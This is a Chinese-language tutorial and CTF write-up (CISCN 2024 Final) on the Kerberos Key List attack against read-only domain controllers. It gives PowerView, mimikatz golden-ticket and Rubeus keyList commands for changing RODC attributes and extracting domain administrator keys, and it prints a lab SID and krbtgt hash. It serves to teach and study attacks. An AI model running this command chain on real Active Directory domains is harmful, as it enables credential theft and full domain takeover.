@@ -1,0 +1,98 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>在 Kerberos 认证系统中，Key List Attack 是一种相对较新的攻击手段，主要针对只读域控制器（RODC）。这种攻击通过利用 Kerberos 协议中的特定扩展来实现，其核心在于请求和获取存储在 KDC 中的加密密钥信息。</p>
+<h1 data-content="1" id="11a1d3178a1e25c349cef010c171abfa">Kerberos 协议</h1>
+<p>Kerberos 协议是一种基于票据的认证协议，允许节点在不安全网络中安全地证明其身份。Kerberos 的核心是 KDC，它负责发放和管理票据（Ticket-Granting Ticket，TGT）和服务票据（Service Ticket，ST）。本文不涉及 Kerberos 协议的基本原理，不熟悉 Kerberos 认证流程的读者，请先阅读 <a href="https://xz.aliyun.com/t/8187" target="_blank">https://xz.aliyun.com/t/8187</a> 学习相关内容。</p>
+<h1 data-content="1" id="5a0fa243a07b836ba8e5877902ede8ec">RODC 特性</h1>
+<p>RODC 是一种特殊类型的域控制器，设计用于提高安全性和降低在安全级别较低的物理位置中的风险。RODC 不存储用户或其他帐户的密码哈希值；相反，它从完全域控制器（RWDC）请求所需的认证信息。RODC 对于存储敏感凭据的能力有严格限制，通过 <code>msDS-RevealOnDemandGroup</code> 和 <code>msDS-NeverRevealGroup</code> 控制这些限制。</p>
+<ul>
+<li>
+<p>msDS-RevealOnDemandGroup<br/>
+该属性作为一个安全组，它列出了那些可以在需求时由 RODC 请求其凭证的用户或计算机帐户。只有当这些帐户的验证请求被转发到 RODC 时，这些帐户的密码散列才会从主域控制器被请求并缓存在 RODC 上。此举措确保了 RODC 只存储那些可能需要频繁验证但不需要高安全级别保护的帐户凭据。</p>
+</li>
+<li>
+<p>msDS-NeverRevealGroup<br/>
+与 msDS-RevealOnDemandGroup 相对，该属性指定了一组帐户，其凭据即使是在请求时也决不应该被 RODC 请求或存储。这通常包括高权限帐户，如域管理员等。这一设置是为了防止在 RODC 遭到攻击时，攻击者能够获得对这些高权重帐户的控制。</p>
+</li>
+</ul>
+<h1 data-content="1" id="dbb54ed1e84f352d01099525667bd718">Key List Request</h1>
+<p>在 Kerberos 协议中，Key List Request 是一种扩展请求，用于从密钥分发中心（KDC）获取一系列加密密钥，这些密钥与特定账户关联，并用于多种加密任务。这种请求特别在只读域控制器（RODC）环境中有其实际应用，因为 RODC 不存储所有用户的完整密钥信息，而是根据需要从全域控制器（RWDC）请求这些信息。</p>
+<p>当客户端需要与服务进行安全通信时，它会发送一个包含 <code>KERB-KEY-LIST-REQ</code> padata 类型的 TGS-REQ （票据授权服务请求）消息到 KDC。这个请求指示 KDC 返回一系列支持的加密类型的密钥。KDC 响应这个请求，通过在 TGS-REP （票据授权服务响应）消息中包含 <code>KERB-KEY-LIST-REP</code> 结构，该结构嵌入在加密的 EncKDCRepPart 结构体中。这些返回的密钥信息通常用于兼容旧版本或特定加密需求。</p>
+<pre><code>KERB-KEY-LIST-REQ ::= SEQUENCE OF Int32 -- encryption type -- 
+KERB-KEY-LIST-REP ::= SEQUENCE OF EncryptionKey</code></pre>
+<h1 data-content="1" id="d7b7ad8bec7d5de944b2652550a03dd9">Key List Attack</h1>
+<h2 data-content="1" id="5fada6f7e8cc76d82dde562323c8a325">1. RODC 管理权限的获取</h2>
+<p>首先攻击者需要获取对 RODC 的管理权限，这可以通过 PowerSploit 项目的 PowerView.ps1 修改 RODC 对象的 ManagedBy 属性实现，将其设置为攻击者控制的账户，这样攻击者就可以直接登入并管理 RODC：</p>
+<div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="s1">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">'managedBy'</span><span class="p">=</span><span class="s1">'CN=Hacker,CN=Users,DC=example,DC=com'</span><span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="6c2ba1a4b4e932d3aa6b1ed987eb1bd0">2. 修改安全组策略</h2>
+<p>一旦控制了 RODC，攻击者可以修改关键的 Active Directory 属性，包括 msDS-NeverRevealGroup 和 msDS-RevealOnDemandGroup。通过这种修改，攻击者可以配置 RODC 来缓存并获取通常不应被获取的高权限用户凭证。</p>
+<p>首先通过 PowerView.ps1 清空 msDS-NeverRevealGroup 属性：</p>
+<div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="s1">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="n">-Clear</span> <span class="s1">'msDS-NeverRevealGroup'</span>
+</pre></div>
+<p>再通过 PowerView.ps1 将域管理员添加到 msDS-RevealOnDemandGroup 属性中：</p>
+<div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="s1">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">'msDS-RevealOnDemandGroup'</span><span class="p">=@(</span><span class="s1">'CN=Administrator,CN=Users,DC=example,DC=com'</span><span class="p">)}</span>
+</pre></div>
+<h2 data-content="1" id="6c4c8571507497862534cde078db4f0c">3. 利用 Key List Request</h2>
+<p>在 RODC 中配置完毕后，攻击者可以发起特定的 Key List Request，强制 RODC 从 RWDC 请求并获取目标高权限账户的密钥信息。通过为域管理员用户伪造黄金票据，来包含请求特定账户密钥的 KERB-KEY-LIST-REQ：</p>
+<div class="highlight"><pre><span></span><span class="c1"># 获取域信息</span>
+mimikatz.exe <span class="s2">"Log"</span> <span class="s2">"Privilege::Debug"</span> <span class="s2">"lsadump::lsa /patch"</span> <span class="s2">"exit"</span>
+
+<span class="c1"># 构造域管理员的黄金票据</span>
+mimikatz.exe kerberos::golden /admin:Administrator /domain:example.com /sid:sid /krbtgt:hash /ticket:ticket.kirbi
+
+<span class="c1"># 请求 Key List</span>
+Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/example.com /dc:dc.example.com /ticket:base64
+</pre></div>
+<p>获取域管理员用户的哈希值后，攻击者可以用它来解密服务票据或其他敏感数据，甚至可能用它来伪造新的票据，进一步在网络中移动，提升权限，或执行其他恶意行为。</p>
+<h1 data-content="1" id="da75589fb0eef053a83379b509264422">赛题举例</h1>
+<p>CISCN 2024 Final 渗透部分 DC Challenge</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805194937-caa2c1b2-5320-1.png"/></p>
+<p>首先可从 WIN-OPS88 中获得 ROAdmins.xlsx 敏感文件，其中包含 RODC 的管理员账号密码，从而可以获得 RODC 的远程桌面</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805200109-6714551e-5322-1.png"/></p>
+<p>使用 RODC 管理员账号密码连接远程桌面 RODC.vertexsoft.local</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805195016-e1982c22-5320-1.png"/></p>
+<p>获取对 RODC 的管理权限：</p>
+<div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="s1">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">'managedBy'</span><span class="p">=</span><span class="s1">'CN=lsabellaTech,CN=Users,DC=vertex,DC=local'</span><span class="p">}</span>
+</pre></div>
+<p>执行 <code>net user /domain</code> 发现可以枚举域内用户，表明现在具有 RODC 管理员权限：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805195039-efcdb578-5320-1.png"/></p>
+<p>但此时没有访问 DC 文件系统的权限：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805195055-f93c048e-5320-1.png"/></p>
+<p>获取域信息：</p>
+<div class="highlight"><pre><span></span>mimikatz.exe <span class="s2">"Log"</span> <span class="s2">"Privilege::Debug"</span> <span class="s2">"lsadump::lsa /patch"</span> <span class="s2">"exit"</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805195111-0277f968-5321-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805203142-ab6591e8-5326-1.png"/></p>
+<p>获得信息如下：</p>
+<pre><code>domain：vertexsoft.local
+sid：S-1-5-21-1670446094-1728415802-1380520873
+krbtgt Hash NTLM：34e335179246ef930dc33fd1e3de6e9e</code></pre>
+<p>清空 msDS-NeverRevealGroup 属性：</p>
+<div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="s1">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="n">-Clear</span> <span class="s1">'msDS-NeverRevealGroup'</span>
+</pre></div>
+<p>将域管理员添加到 msDS-RevealOnDemandGroup 属性中：</p>
+<div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+
+<span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="s1">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">'msDS-RevealOnDemandGroup'</span><span class="p">=@(</span><span class="s1">'CN=Administrator,CN=Users,DC=vertex,DC=local'</span><span class="p">)}</span>
+</pre></div>
+<p>完成黄金票据构造：</p>
+<div class="highlight"><pre><span></span>mimikatz.exe kerberos::golden /admin:Administrator /domain:vertexsoft.local /sid:S-1-5-21-1670446094-1728415802-1380520873 /krbtgt:34e335179246ef930dc33fd1e3de6e9e /ticket:ticket.kirbi
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240805195158-1ec335a6-5321-1.png"/></p>
+<p>发起 Key List Request：</p>
+<div class="highlight"><pre><span></span>Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/vertex.local /dc:DC.vertex.local /ticket:base64
+</pre></div>
+<p>最后通过哈希传递获得 DC 权限拿到 flag</p>
+</div>
+</div>
